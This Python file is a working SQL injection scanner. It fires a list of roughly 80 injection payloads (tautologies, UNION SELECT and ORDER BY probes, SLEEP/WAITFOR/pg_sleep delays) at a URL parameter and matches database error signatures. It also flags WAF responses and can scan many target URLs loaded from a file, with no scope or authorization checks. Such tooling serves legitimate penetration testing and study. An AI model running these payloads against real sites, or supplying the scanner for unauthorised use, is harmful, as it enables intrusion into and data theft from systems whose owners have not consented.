"""
SQLi Scanner - Merged & Enhanced
Combines sql_injection.py (Boolean + Time-based) with sqli_detect.py (WAF detection + 60+ payloads)
"""

import time
import sys
import requests
from requests.exceptions import RequestException

try:
    from colorama import init, Fore
    init(autoreset=True)
    COLOR = True
except ImportError:
    COLOR = False
    class Fore:
        GREEN = RED = YELLOW = CYAN = BLUE = RESET = ""

# ─────────────────────────────────────────
# 🎨  OUTPUT HELPERS
# ─────────────────────────────────────────

def info(msg):    print(Fore.CYAN   + f"[*] {msg}")
def ok(msg):      print(Fore.GREEN  + f"[+] {msg}")
def warn(msg):    print(Fore.YELLOW + f"[!] {msg}")
def fail(msg):    print(Fore.RED    + f"[-] {msg}")
def section(msg): print(Fore.BLUE   + f"\n{'─'*50}\n    {msg}\n{'─'*50}")

# ─────────────────────────────────────────
# 📦  META  (compat with framework callers)
# ─────────────────────────────────────────

meta = {
    "name":        "SQL Injection (Merged)",
    "severity":    "High",
    "description": "Boolean + Error + Time-based SQLi with WAF detection and 60+ payloads",
}

inputs = ["param"]

# ─────────────────────────────────────────
# 📋  PAYLOADS  (from sqli_detect.py, expanded)
# ─────────────────────────────────────────

ERROR_PAYLOADS = [
    "'", "''", "' OR 1=1; --", "' OR '1'='1", "' or", "-- or", "' OR '1",
    "' OR 1 - - -", " OR \"\"= ", " OR 1 = 1 - - -", "' OR '' = '",
    "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
    "' UNION SELECT NULL,NULL,NULL--", "1' ORDER BY 1, 2--+",
    "1' ORDER BY 1, 2, 3--+", "' AND 1=2 UNION SELECT 1,2,3 --",
    "1' GROUP BY 1, 2, --+", "1' GROUP BY 1, 2, 3--+",
    "' GROUP BY columnnames having 1= 1 - -", "-1' UNION SELECT 1, 2, 3--+",
    "OR 1 = 1", "OR 1 = 0", "OR 1= 1#", "OR 1 = 0#",
    "OR 1 = 1--", "OR 1= 0--", "HAVING 1 = 1", "HAVING 1= 0",
    "HAVING 1= 1#", "HAVING 1= 0#", "HAVING 1 = 1--", "HAVING 1 = 0--",
    "AND 1= 1", "AND 1= 0", "AND 1 = 1--", "AND 1 = 0--",
    "AND 1= 1#", "AND 1= 0#", "AND 1 = 1 AND '%' ='", "AND 1 = 0 AND '%' ='",
    "WHERE 1= 1 AND 1 = 1", "WHERE 1 = 1 AND 1 = 0",
    "WHERE 1 = 1 AND 1 = 1#", "WHERE 1 = 1 AND 1 = 0#",
    "WHERE 1 = 1 AND 1 = 1--", "WHERE 1 = 1 AND 1 = 0--",
    *[f"ORDER BY {n}--" for n in range(1, 32)],
    "ORDER BY 31337--",
]

BOOL_TRUE  = "' OR '1'='1"
BOOL_FALSE = "' OR '1'='2"

TIME_PAYLOADS = [
    "' OR SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--",   # MSSQL
    "' OR pg_sleep(3)--",           # PostgreSQL
]

# ─────────────────────────────────────────
# 🔍  ERROR SIGNATURES  (from both files)
# ─────────────────────────────────────────

DB_ERRORS = {
    "mysql":      ["you have an error in your sql syntax;", "warning: mysql",
                   "sql syntax", "pdo", "odbc"],
    "sql_server": ["unclosed quotation mark after the character string",
                   "incorrect syntax near"],
    "oracle":     ["quoted string not properly terminated",
                   "ora-00933: sql command not properly ended",
                   "ora-00936: missing expression"],
    "postgresql": ["pg_query", "syntax error at or near"],
    "generic":    ["syntax error", "warning"],
}

HEADERS = {"User-Agent": "Mozilla/5.0"}

# ─────────────────────────────────────────
# 🛠️  CORE HELPERS
# ─────────────────────────────────────────

def _get(url, timeout=6):
    return requests.get(url, headers=HEADERS, timeout=timeout)


def _check_error(response):
    """Return (True, db_type, matched_error) or (False, None, None)."""
    content = response.content.decode(errors="ignore").lower()
    for db_type, patterns in DB_ERRORS.items():
        for pattern in patterns:
            if pattern in content:
                return True, db_type, pattern
    return False, None, None


def _check_waf(response, baseline_length, payload):
    """Detect WAF based on HTTP status or content-length change."""
    if response.status_code in [403, 406, 429]:
        warn(f"WAF detected → HTTP {response.status_code}  payload='{payload}'")
        return True
    if abs(len(response.content) - baseline_length) > 50:
        warn(f"WAF behavior → length changed  payload='{payload}'")
        return True
    return False

# ─────────────────────────────────────────
# 🚀  SCAN TECHNIQUES
# ─────────────────────────────────────────

def _boolean_scan(url, param):
    """Returns finding string or None."""
    try:
        r_true  = _get(f"{url}?{param}={BOOL_TRUE}")
        r_false = _get(f"{url}?{param}={BOOL_FALSE}")
        if r_true.text != r_false.text:
            return "Boolean-based SQLi detected (response differs for TRUE vs FALSE)"
    except RequestException:
        pass
    return None


def _error_scan(url, param, baseline_length):
    """Returns list of (payload, db_type, error_str) tuples."""
    hits = []
    for payload in ERROR_PAYLOADS:
        full_url = f"{url}?{param}={payload}"
        try:
            r = _get(full_url)
            _check_waf(r, baseline_length, payload)
            found, db_type, error_str = _check_error(r)
            if found:
                ok(f"Error-based SQLi → payload='{payload}'  db={db_type}  sig='{error_str}'")
                hits.append((payload, db_type, error_str))
            else:
                fail(f"No hit  payload='{payload}'")
        except RequestException as e:
            warn(f"Request error  payload='{payload}': {e}")
    return hits


def _time_scan(url, param):
    """Returns finding string or None."""
    for payload in TIME_PAYLOADS:
        try:
            start = time.time()
            _get(f"{url}?{param}={payload}", timeout=10)
            delay = time.time() - start
            if delay > 2.5:
                return f"Time-based SQLi detected (delay={delay:.1f}s, payload='{payload}')"
        except RequestException:
            pass
    return None

# ─────────────────────────────────────────
# 🎯  MAIN scan()  — framework-compatible
# ─────────────────────────────────────────

def scan(url, param="id"):
    """
    Run all SQLi techniques against url?param=<payload>.

    Returns:
        dict with keys: vulnerable (bool), result (str), severity (str), details (list)
    """
    findings = []
    details  = []

    section("Starting SQLi Scan")
    info(f"Target : {url}")
    info(f"Param  : {param}")

    # ── Baseline ──────────────────────────────
    try:
        baseline = _get(url)
        baseline_length = len(baseline.content)
        info(f"Baseline response length: {baseline_length}")
    except RequestException as e:
        return {"vulnerable": False, "result": f"Baseline error: {e}", "severity": "Low", "details": []}

    # ── Boolean-based ─────────────────────────
    section("Boolean-based scan")
    b = _boolean_scan(url, param)
    if b:
        ok(b)
        findings.append(b)
        details.append({"type": "boolean", "finding": b})

    # ── Error-based ───────────────────────────
    section(f"Error-based scan ({len(ERROR_PAYLOADS)} payloads)")
    error_hits = _error_scan(url, param, baseline_length)
    if error_hits:
        summary = f"Error-based SQLi detected ({len(error_hits)} payload(s) hit)"
        findings.append(summary)
        for payload, db_type, err in error_hits:
            details.append({"type": "error", "payload": payload, "db": db_type, "signature": err})

    # ── Time-based ────────────────────────────
    section("Time-based scan")
    t = _time_scan(url, param)
    if t:
        ok(t)
        findings.append(t)
        details.append({"type": "time", "finding": t})

    # ── Result ────────────────────────────────
    section("Scan complete")
    if findings:
        ok(f"VULNERABLE — {len(findings)} technique(s) confirmed")
        return {
            "vulnerable": True,
            "result":     " | ".join(findings),
            "severity":   "High",
            "details":    details,
        }

    fail("No SQLi vulnerability detected")
    return {
        "vulnerable": False,
        "result":     "No SQL Injection detected",
        "severity":   "Low",
        "details":    [],
    }

# ─────────────────────────────────────────
# 🖥️  CLI ENTRY-POINT
# ─────────────────────────────────────────

if __name__ == "__main__":
    print(Fore.GREEN + r"""
   _____       _ _   ____
  / ____|     | (_) / ___|  ___ __ _ _ __  _ __   ___ _ __
  \___ \ / _` | | | \___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
   ___) | (_| | | |  ___) | (_| (_| | | | | | | |  __/ |
  |____/ \__, |_|_| |____/ \___\__,_|_| |_|_| |_|\___|_|
           |_|        Merged v2.0  — Boolean + Error + Time
""")

    try:
        choice = input(Fore.CYAN + "[*] Scan type  (1=single URL, 2=file): ").strip()

        if choice == "1":
            url   = input(Fore.CYAN + "[*] Target URL (e.g. http://site.com/page.php?): ").strip()
            param = input(Fore.CYAN + "[*] Parameter name (default: id): ").strip() or "id"
            if not url.startswith(("http://", "https://")):
                fail("Invalid URL — must start with http:// or https://")
            else:
                result = scan(url, param)
                print("\n" + ("=" * 50))
                if result["vulnerable"]:
                    ok(f"[!!!] VULNERABLE → {result['result']}")
                else:
                    fail(f"[+]  NOT vulnerable → {result['result']}")

        elif choice == "2":
            path  = input(Fore.CYAN + "[*] Path to URLs file: ").strip()
            param = input(Fore.CYAN + "[*] Parameter name (default: id): ").strip() or "id"
            try:
                with open(path) as f:
                    urls = [u.strip() for u in f if u.strip().startswith(("http://", "https://"))]
                info(f"Loaded {len(urls)} URL(s)")
                for url in urls:
                    scan(url, param)
            except FileNotFoundError:
                fail("File not found.")
        else:
            fail("Invalid choice.")

    except KeyboardInterrupt:
        warn("\nInterrupted by user.")
    except Exception as e:
        fail(f"Unexpected error: {e}")
    finally:
        input(Fore.CYAN + "\nPress Enter to exit.")
